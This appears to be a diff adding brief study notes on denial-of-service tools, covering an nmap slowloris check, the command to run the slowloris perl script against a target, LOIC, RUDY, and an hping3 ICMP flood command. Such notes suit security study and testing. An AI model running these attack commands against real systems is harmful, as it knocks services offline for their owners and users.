@@ -1,0 +1,11 @@
+- slowloris tool used
+	- to check if our target is susceptible to slow loris attack
+		- command: nmap --script http-slowloris-check <ip address of target>
+		- for slowloris attack download slowloris github perl script
+		- we have to clone the repository
+		- command in directory: perl slowloris.pl -dns <ip of target system>
+- Low Orbit Ion Cannon(LOIC) can also be used
+- RUDY(R U Dead Yet) tool
+- ping of death 
+	- hping3 tool
+		- eg command: sudo hping3 <ip address of target> -1 --fast
